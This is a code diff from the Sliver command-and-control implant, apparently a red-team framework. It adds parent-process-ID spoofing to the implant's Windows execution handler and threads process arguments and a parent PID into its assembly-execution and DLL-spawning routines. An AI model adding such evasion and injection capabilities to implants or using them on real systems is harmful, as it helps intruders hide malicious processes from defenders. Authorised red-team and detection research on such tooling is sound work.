@@ -36,6 +36,7 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/priv"
 	"github.com/bishopfox/sliver/implant/sliver/registry"
 	"github.com/bishopfox/sliver/implant/sliver/service"
+	"github.com/bishopfox/sliver/implant/sliver/spoof"
 	"github.com/bishopfox/sliver/implant/sliver/taskrunner"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
@@ -63,7 +64,7 @@ var (
 		sliverpb.MsgEnvReq:                   getEnvHandler,
 		sliverpb.MsgSetEnvReq:                setEnvHandler,
 		sliverpb.MsgUnsetEnvReq:              unsetEnvHandler,
-		sliverpb.MsgExecuteTokenReq:          executeTokenHandler,
+		sliverpb.MsgExecuteWindowsReq:        executeWindowsHandler,
 		sliverpb.MsgGetPrivsReq:              getPrivsHandler,
 		sliverpb.MsgCurrentTokenOwnerReq:     currentTokenOwnerHandler,
 
@@ -225,7 +226,7 @@ func executeAssemblyHandler(data []byte, resp RPCResponse) {
 		// {{end}}
 		return
 	}
-	output, err := taskrunner.ExecuteAssembly(execReq.Data, execReq.Process)
+	output, err := taskrunner.ExecuteAssembly(execReq.Data, execReq.Process, execReq.ProcessArgs, execReq.PPid)
 	execAsm := &sliverpb.ExecuteAssembly{Output: []byte(output)}
 	if err != nil {
 		execAsm.Response = &commonpb.Response{
@@ -237,7 +238,7 @@ func executeAssemblyHandler(data []byte, resp RPCResponse) {
 
 }
 
-func executeTokenHandler(data []byte, resp RPCResponse) {
+func executeWindowsHandler(data []byte, resp RPCResponse) {
 	var (
 		err       error
 		stdErr    io.Writer
@@ -260,6 +261,14 @@ func executeTokenHandler(data []byte, resp RPCResponse) {
 	// Execute with current token
 	cmd.SysProcAttr = &windows.SysProcAttr{
 		Token: syscall.Token(priv.CurrentToken),
+	}
+	if execReq.PPid != 0 {
+		err := spoof.SpoofParent(execReq.PPid, cmd)
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("could not spoof parent PID: %v\n", err)
+			// {{end}}
+		}
 	}
 
 	if execReq.Output {
@@ -374,7 +383,7 @@ func spawnDllHandler(data []byte, resp RPCResponse) {
 	//{{if .Config.Debug}}
 	log.Printf("ProcName: %s\tOffset:%x\tArgs:%s\n", spawnReq.GetProcessName(), spawnReq.GetOffset(), spawnReq.GetArgs())
 	//{{end}}
-	result, err := taskrunner.SpawnDll(spawnReq.GetProcessName(), spawnReq.GetData(), spawnReq.GetOffset(), spawnReq.GetArgs(), spawnReq.Kill)
+	result, err := taskrunner.SpawnDll(spawnReq.GetProcessName(), spawnReq.GetProcessArgs(), spawnReq.GetPPid(), spawnReq.GetData(), spawnReq.GetOffset(), spawnReq.GetArgs(), spawnReq.Kill)
 	spawnResp := &sliverpb.SpawnDll{Result: result}
 	if err != nil {
 		spawnResp.Response = &commonpb.Response{
